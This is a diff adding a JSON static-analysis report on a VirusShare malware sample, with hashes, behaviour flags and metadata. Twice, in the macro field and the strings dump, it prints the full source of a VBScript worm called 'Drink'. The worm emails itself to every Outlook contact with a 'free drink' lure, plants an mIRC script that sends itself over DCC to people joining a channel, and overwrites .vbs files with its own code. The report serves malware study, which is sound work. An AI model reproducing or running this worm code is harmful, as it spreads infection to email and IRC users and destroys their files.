@@ -1,0 +1,79 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Write": "May write to a file"
+        },
+        "macro": "'Worm Name: Drink\n'Written By: Anonymous\nOn Error Resume Next\nWorm = WScript.ScriptFullName\nSet WSH = CreateObject(\"WScript.Shell\") \nSet FSO = CreateObject(\"Scripting.FileSystemObject\")\nSet MSOE = CreateObject(\"Outlook.Application\")\nIf MSOE <> \"\" Then\nSet objOE = MSOE.GetNameSpace(\"MAPI\")\nFor objNAME = 1 to objOE.AddressLists.Count\nSet objADD = MSOE.CreateItem(0)\nSet objWORM = objOE.AddressLists.Item(objNAME)\nobjADD.Attachments.Add Worm\nobjADD.Subject = \"Have a free drink on me check out the attachment\"\nobjADD.Body = \"your on your way to a free drink!  Check out the attachment for more info.\"\nSet objVIR = objWORM.AddressEntries\nSet objMAPI = objADD.Recipients\nFor objIWORM = 1 to objVIR.Count\nobjADD.Recipients.Add objVIR.Item(objIWORM)\nNext\nobjADD.Send\nNext\nEnd If\nSet objIRC = FSO.CreateTextFile(\"C:\\mirc\\script.ini\", True)\nobjIRC.WriteLine \"[script]\"\nobjIRC.WriteLine \"n0=ON 1:JOIN:#:{ if ( $nick != $me ) {\"\nobjIRC.Write \"n1=/dcc           send         $nick \"\"\"\nobjIRC.Write Worm\nobjIRC.WriteLine \"\"\" }\"\nobjIRC.Close\nSet objINI = FSO.OpenTextFile(Worm, 1, 0)\nobjSCRIPT = objINI.ReadAll\nobjINI.Close\nobjBODY = Left(Worm, InStrRev(Worm, \"\\\"))\nFor Each objFILE in FSO.GetFolder(objBODY).Files\nIf ( Right(objFILE.Name, 4) = \".vbs\" ) Then\nSet objPHILE = FSO.CreateTextFile(objFILE.Name, True)\nobjPHILE.Write objSCRIPT\nobjPHILE.Close\nEnd If\nNext"
+    },
+    "filename": "VirusShare_0127c451fcf9f1ece8d54b34a3169f6d",
+    "filesize": 1394,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0127c451fcf9f1ece8d54b34a3169f6d",
+        "sha1": "7594735ebe7dd478b92f412a0dd543c5fe8f21a9",
+        "sha256": "78901b6d362ac08621d3b398bd07f736207bd91fc888da8b791f38950be82f8f"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "'Worm Name: Drink",
+            "'Written By: Anonymous",
+            "On Error Resume Next",
+            "Worm = WScript.ScriptFullName",
+            "Set WSH = CreateObject(\"WScript.Shell\") ",
+            "Set FSO = CreateObject(\"Scripting.FileSystemObject\")",
+            "Set MSOE = CreateObject(\"Outlook.Application\")",
+            "If MSOE <> \"\" Then",
+            "Set objOE = MSOE.GetNameSpace(\"MAPI\")",
+            "For objNAME = 1 to objOE.AddressLists.Count",
+            "Set objADD = MSOE.CreateItem(0)",
+            "Set objWORM = objOE.AddressLists.Item(objNAME)",
+            "objADD.Attachments.Add Worm",
+            "objADD.Subject = \"Have a free drink on me check out the attachment\"",
+            "objADD.Body = \"your on your way to a free drink!  Check out the attachment for more info.\"",
+            "Set objVIR = objWORM.AddressEntries",
+            "Set objMAPI = objADD.Recipients",
+            "For objIWORM = 1 to objVIR.Count",
+            "objADD.Recipients.Add objVIR.Item(objIWORM)",
+            "Next",
+            "objADD.Send",
+            "Next",
+            "End If",
+            "Set objIRC = FSO.CreateTextFile(\"C:\\mirc\\script.ini\", True)",
+            "objIRC.WriteLine \"[script]\"",
+            "objIRC.WriteLine \"n0=ON 1:JOIN:#:{ if ( $nick != $me ) {\"",
+            "objIRC.Write \"n1=/dcc           send         $nick \"\"\"",
+            "objIRC.Write Worm",
+            "objIRC.WriteLine \"\"\" }\"",
+            "objIRC.Close",
+            "Set objINI = FSO.OpenTextFile(Worm, 1, 0)",
+            "objSCRIPT = objINI.ReadAll",
+            "objINI.Close",
+            "objBODY = Left(Worm, InStrRev(Worm, \"\\\"))",
+            "For Each objFILE in FSO.GetFolder(objBODY).Files",
+            "If ( Right(objFILE.Name, 4) = \".vbs\" ) Then",
+            "Set objPHILE = FSO.CreateTextFile(objFILE.Name, True)",
+            "objPHILE.Write objSCRIPT",
+            "objPHILE.Close",
+            "End If",
+            "Next"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.299709",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
